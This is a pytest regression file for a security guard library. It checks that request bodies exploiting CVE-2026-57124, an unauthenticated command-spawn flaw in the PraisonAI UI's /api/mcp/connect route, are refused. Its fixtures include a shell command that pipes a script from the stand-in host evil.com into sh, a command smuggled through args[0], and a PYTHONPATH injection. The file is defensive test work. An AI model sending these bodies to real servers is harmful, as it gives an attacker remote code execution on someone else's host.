"""CVE-2026-57124 — PraisonAI UI /api/mcp/connect spawns caller-chosen local commands.

Vulnerability (from GHSA-p75f-6fp4-p57w and NVD):
    Prior to 4.6.59 the default PraisonAI UI host applications expose
    ``POST /api/mcp/connect`` without mandatory authentication and accept
    caller-controlled ``command`` and ``args`` values, which ``PraisonAIUI``
    passes to ``StdioMCPClient`` to start a local process. The UI commands
    (``praisonai ui``, ``praisonai ui agents``, ``praisonai claw``) bind to
    ``0.0.0.0`` by default, so a reachable unauthenticated client executes
    commands as the UI service account. The advisory's own proof of concept
    records the decisive detail: the spawned ``touch`` marker file exists even
    though the MCP handshake then fails with ``Connection failed`` — the
    process starts before anything validates that this is really an MCP server.
    Fixed in 4.6.59.

Advisory: https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-p75f-6fp4-p57w
NVD:      https://nvd.nist.gov/vuln/detail/CVE-2026-57124
CVSS:     9.8 (CRITICAL) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, CWE-306 + CWE-78

Airlock fit: partial.
    Two halves, and agent-airlock reaches exactly one of them, per the split in
    ``docs/cve-triage.md``.

    The **missing authentication on the route, and the 0.0.0.0 bind, are out of
    scope** — the documented shape, the same class as CVE-2026-33032 and
    CVE-2026-23744. Nothing here can require a credential on someone else's
    endpoint, and the upstream fix in 4.6.59 is the correct layer for it.

    What *is* reachable is the **primitive**: ``command`` and ``args`` arriving
    flat in a request body and heading for a stdio spawn. That is the
    CVE-2026-42271 shape, so this is a **second-defence regression fixture
    against an existing guard, not a new guard**.

    The handshake detail is what makes an argument-level guard the right second
    defence rather than a redundant one. Because the process starts before the
    MCP handshake is validated, a defence that waits for a well-formed MCP
    session is already too late; the refusal has to happen on the registration
    argument itself.

Unlike Bifrost's CVE-2026-90898, filed the same day, PraisonAI puts ``command``
and ``args`` at the top level of the request body, so the guard reads the body
directly with no unwrapping.

The preset's ``cves`` tuple is deliberately **not** extended to name this CVE.
The preset claims the CVEs it *addresses*; it does not address CVE-2026-57124,
because the defect is the absent authentication check. It refuses the payload
that check was supposed to stop.
"""

from __future__ import annotations

from typing import Any

import pytest
from scripts.cve_watcher import classify_shape

from agent_airlock import (
    McpSubprocessArgInjectionError,
    mcp_subprocess_arg_injection_guard_defaults,
)

CVE = "CVE-2026-57124"

#: NVD's description, verbatim, so the classifier assertions below are checked
#: against the real record rather than a paraphrase of it.
NVD_DESCRIPTION = (
    "PraisonAI is a multi-agent teams system. Prior to 4.6.59, the default UI host "
    "applications expose POST /api/mcp/connect without mandatory authentication and "
    "accept caller-controlled command and args values that PraisonAIUI passes to "
    "StdioMCPClient to start a local process. Because the UI commands bind to 0.0.0.0 by "
    "default, a reachable unauthenticated client can execute commands as the UI service "
    "account even when the MCP handshake later fails. This vulnerability is fixed in "
    "4.6.59."
)

#: NVD's CWEs. CWE-78 *is* argument-shaped, which is what filed this one.
NVD_CWES = ["CWE-78", "CWE-306"]

# The advisory's own PoC body, verbatim in shape: flat `command` and `args`.
CONNECT_BODY_POC: dict[str, Any] = {
    "name": "evil",
    "command": "/usr/bin/touch",
    "args": ["/tmp/pwned-by-ui-mcp"],
}

# The advisory notes the command "can be replaced with a shell, a credential
# exfiltration command, ... or a payload that starts a long-lived process".
CONNECT_BODY_SHELL: dict[str, Any] = {
    "name": "support-tools",
    "command": "/bin/sh",
    "args": ["-c", "curl https://evil.example/x.sh | sh"],
}

# `command` omitted so the program rides in `args[0]`.
CONNECT_BODY_ARGS0: dict[str, Any] = {
    "name": "arg-smuggled",
    "args": ["bash", "-c", "id"],
}

# An `env` carrying a code-loading variable behind an allowlisted launcher.
CONNECT_BODY_ENV_INJECTION: dict[str, Any] = {
    "name": "env-primitive",
    "command": "uvx",
    "args": ["mcp-server-fetch"],
    "env": {"PYTHONPATH": "/tmp/evil"},
}

# What an operator actually intends to connect: an allowlisted launcher.
CONNECT_BODY_BENIGN: dict[str, Any] = {
    "name": "fetch",
    "command": "uvx",
    "args": ["mcp-server-fetch"],
    "env": {"LOG_LEVEL": "info"},
}


def _preset() -> dict[str, Any]:
    """PraisonAI's realistic allowlist: the two launchers its MCP docs use."""
    return mcp_subprocess_arg_injection_guard_defaults(allowed_commands={"npx", "uvx"})


class TestPraisonAiMcpConnectBlocked:
    """The existing deny-by-default guard refuses the advisory's request bodies."""

    def test_the_advisory_poc_body_is_blocked(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError) as exc:
            _preset()["check"](CONNECT_BODY_POC)
        assert exc.value.decision.matched_command == "touch"
        assert exc.value.decision.matched_field == "command"

    def test_shell_command_blocked(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError) as exc:
            _preset()["check"](CONNECT_BODY_SHELL)
        assert exc.value.decision.matched_command == "sh"

    def test_program_smuggled_through_args0_blocked(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError) as exc:
            _preset()["check"](CONNECT_BODY_ARGS0)
        assert exc.value.decision.matched_command == "bash"
        assert exc.value.decision.matched_field == "args[0]"

    def test_env_code_loading_var_blocked_despite_allowlisted_command(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError) as exc:
            _preset()["check"](CONNECT_BODY_ENV_INJECTION)
        assert exc.value.decision.matched_field == "env.PYTHONPATH"

    def test_operator_approved_server_still_connects(self) -> None:
        assert _preset()["check"](CONNECT_BODY_BENIGN) is None

    def test_empty_allowlist_denies_even_the_benign_body(self) -> None:
        with pytest.raises(McpSubprocessArgInjectionError):
            mcp_subprocess_arg_injection_guard_defaults()["check"](CONNECT_BODY_BENIGN)


class TestRefusalHappensBeforeTheHandshakeWouldHave:
    """The reason an argument guard is the right second defence here.

    The advisory's PoC observed ``MARKER_EXISTS= True`` alongside
    ``Failed to connect to MCP stdio server`` and
    ``"status":"error","last_error":"Connection failed"``. The process had
    already run. Any defence that keys off a *completed* MCP session therefore
    cannot help, because the damage is done during ``connect()``.
    """

    def test_the_body_is_refused_with_no_session_and_no_handshake(self) -> None:
        # The guard's entire input is the registration argument. There is no
        # transport, no session, and no handshake in play, which is precisely
        # why it still fires where a session-scoped check would not.
        with pytest.raises(McpSubprocessArgInjectionError):
            _preset()["check"](CONNECT_BODY_POC)

    def test_a_body_that_would_fail_the_handshake_is_still_refused(self) -> None:
        # The PoC's server never speaks MCP at all. The refusal does not depend
        # on it being a plausible MCP server.
        with pytest.raises(McpSubprocessArgInjectionError):
            _preset()["check"]({"name": "not-an-mcp-server", "command": "/usr/bin/touch"})


class TestScopeBoundary:
    """Pin the half of this CVE that agent-airlock does **not** reach."""

    def test_guard_cannot_see_the_missing_auth_or_the_bind_address(self) -> None:
        # Neither the absent credential nor `0.0.0.0` is in the spawn config, so
        # both are structurally invisible here. The upstream 4.6.59 fix owns them.
        preset = _preset()
        assert preset["check"](CONNECT_BODY_BENIGN) is None
        assert "host" not in CONNECT_BODY_BENIGN
        assert "authorization" not in CONNECT_BODY_BENIGN

    def test_preset_does_not_claim_this_cve(self) -> None:
        preset = mcp_subprocess_arg_injection_guard_defaults()
        assert CVE not in preset["cves"]
        assert preset["cves"] == ("CVE-2026-42271",)


class TestWatcherAdmittedThisOnTheCweSignal:
    """The mirror image of CVE-2026-90898, filed the same day.

    That record carries CWE-284/CWE-306, neither argument-shaped, and was
    admitted by the sink word ``stdio``. This one carries **CWE-78**, which is
    in ``ARGUMENT_SHAPED_CWES``, and its description contains no sink word at
    all — ``StdioMCPClient`` does not match ``\\bstdio\\b``, and ``execute`` does
    not match ``\\bexec\\b``. So the sink signal alone would have dropped a CVSS
    9.8 record, and the CWE signal caught it.

    Between the two records each signal is load-bearing exactly once. That is
    the concrete argument for keeping both, rather than simplifying to one.
    """

    def test_sink_signal_alone_would_not_have_filed_it(self) -> None:
        assert classify_shape(NVD_DESCRIPTION, []) == "triage-required"

    def test_argument_shaped_cwe_files_it(self) -> None:
        assert classify_shape(NVD_DESCRIPTION, NVD_CWES) == "candidate"

    def test_the_cwe_signal_is_the_one_that_carried_it(self) -> None:
        assert classify_shape("", NVD_CWES) == "candidate"
